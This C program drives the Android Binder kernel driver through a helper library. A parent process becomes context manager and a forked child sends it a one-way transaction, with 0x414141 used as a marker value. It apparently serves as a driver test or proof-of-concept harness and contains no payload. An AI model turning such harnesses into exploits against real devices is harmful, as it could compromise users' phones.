#include "binder.h"

int target_proc(){
    BINDER_INFO info;
    PBINDER_INFO info_ptr = &info;
    if(binder_open(info_ptr, 128*1024) == BINDER_VERSION_ERROR){
        perror("binder version error");
        return -1;
    }
    binder_become_context_manager(&info, 0x414141, (binder_uintptr_t)NULL, TRUE);
    while(1){
        sleep(1000);
    }
    return 0;
}
int main(int argc, char* argv[]){
    pid_t pid = fork();
    if(pid < 0){
        perror("child process error");
        return -1;
    } else if(pid == 0){
        BINDER_INFO info;
        PBINDER_INFO info_ptr = &info;
        NEW_TR_BUILDER(tb);
        if(binder_open(info_ptr, 128*1024) == BINDER_VERSION_ERROR){
            perror("binder version error");
            return -1;
        }
        binder_increfs(info_ptr, 0);
        tb.set_tr_target_handle_(&tb, 0);
        tb.set_tr_cookie_(&tb, 0x414141);
        tb.set_tr_flags_(&tb, TF_ONE_WAY);
        binder_transaction(info_ptr, NULL, 0, tb.tr_);
        binder_close(info_ptr);
    } else {
        return target_proc();
    }
    return 0;
}